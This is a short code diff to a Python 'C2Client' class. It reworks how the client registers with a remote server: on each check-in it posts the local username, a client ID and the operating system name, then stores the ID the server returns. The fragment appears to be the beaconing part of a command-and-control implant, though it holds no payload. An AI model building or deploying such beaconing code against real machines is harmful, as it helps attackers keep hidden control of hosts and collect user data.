@@ -22,18 +22,17 @@ class C2Client:
         
         try:
             username = getpass.getuser()
-
-            if not self.client_id:
-                payload = {"username": username, "client_id": "", "op_system": os.name}
-                response = requests.post(url, json=payload)
-                self.client_id = response.json().get("client_id")
+            payload = {"username": username, "client_id": self.client_id, "op_system": os.name}
+            response = requests.post(url, json=payload)
+            response_data = response.json()
+            
+            if "client_id" in response_data:
+                self.client_id = response_data.get("client_id")
                 
                 with open(self.key_file_path, "w") as f:
                     f.write(self.client_id)
                 
-                print(response.json())
-            else:
-                print(f"Using existing client ID: {self.client_id}")
+            print(response_data)
         except Exception:
             raise Exception
 
